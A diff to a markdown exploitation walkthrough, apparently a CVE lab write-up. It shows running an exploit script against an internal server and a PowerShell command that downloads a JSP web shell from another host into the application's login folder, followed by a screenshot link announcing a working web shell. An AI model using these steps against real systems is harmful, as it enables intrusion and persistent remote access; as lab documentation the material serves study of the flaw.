@@ -24,15 +24,33 @@
    python3 exploit.py http://192.168.20.135:8080/ msiexec.exe
    ```
 
-   ![CVE-Exploitation-Success](images/MSIExec/CVE-Exploitation-Success.png)
+   ![CVE-Exploitation-Success](CVE-Exploitation-Success.png)
 2. the Next step is getting a WebShell by Downloading wpsh.jsp by this command:
 
    ```
    powershell.exe Invoke-WebRequest -Uri "http://192.168.20.134:9000/wpsh.jsp" -OutFile "../custom/login/wpsh.jsp"
    ```
+   ![](download-wpsh.png)
 
+   We Got a Web Shell now!!
+   ![image](https://github.com/user-attachments/assets/51ac4558-d4a5-4ac7-b665-6f96bc5e0ab4)
 
 3.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+------
 
 # Trash
 
